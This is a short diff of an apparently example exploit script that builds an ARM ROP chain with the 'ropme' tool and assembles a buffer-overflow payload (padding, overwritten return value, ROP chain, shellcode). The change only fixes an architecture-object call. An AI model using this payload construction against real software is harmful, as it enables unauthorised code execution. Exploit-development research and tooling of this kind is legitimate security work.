@@ -31,7 +31,7 @@ target_address = buffer_address + 700
 print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)
 
 print "Using automatically built ROP chain"
-rop = ropme.rop_to_shellcode([(filename, None, 0), (libc, libc_gadget_file, libc_address)], target_address, archinfo.ArchARM, logging.DEBUG)
+rop = ropme.rop_to_shellcode([(filename, None, 0), (libc, libc_gadget_file, libc_address)], target_address, archinfo.ArchARM(), logging.DEBUG)
 
 payload = 'A'*512 + 'B'*4 + rop
 payload += ((700 - len(payload)) * 'B') + shellcode
